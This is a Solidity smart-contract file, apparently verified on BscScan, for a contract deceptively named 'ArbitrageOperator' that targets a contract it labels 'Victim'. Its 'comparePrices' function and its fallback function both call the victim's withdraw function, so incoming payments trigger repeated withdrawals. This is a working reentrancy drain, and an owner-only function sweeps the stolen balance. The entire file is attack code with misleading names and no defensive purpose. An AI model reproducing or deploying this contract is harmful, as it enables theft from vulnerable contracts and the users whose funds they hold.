/**
 *Submitted for verification at BscScan.com on 2021-10-12
*/

//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.4;

// 0xe9d1D2a27458378Dd6C6F0b2c390807AEd2217Ca

  contract Victim {

    function withdraw(address assetAddress, uint112 amount) external{}
    function depositAsset(address assetAddress, uint112 amount) external {}

 }


contract ArbitrageOperator  {


    Victim public victim;
    address payable public owner;

    constructor(address _addressOfContract) payable { 
        victim = Victim(_addressOfContract);
        owner = payable(msg.sender);
    }
   

     event Deposit(address sender, uint amount, uint balance);
     event Withdraw(uint amount, uint balance);
     event Transfer(address to, uint amount, uint balance);
     


   

    function withDrawEther() public { 
        uint amount = address(this).balance;
        (bool success, ) = owner.call{value:amount}("");
        require(success, "Failed to send BNB");
        
    }

     


   function totalBalance() external view returns(uint) {
     return payable(address(this)).balance;
   }


   

  function comparePrices() external payable {
          victim.withdraw(0x0000000000000000000000000000000000000000, 1000000000);  
    }


 
    
     fallback() external  {
           victim.withdraw(0x0000000000000000000000000000000000000000, 1000000000);  
    }    

 
    


}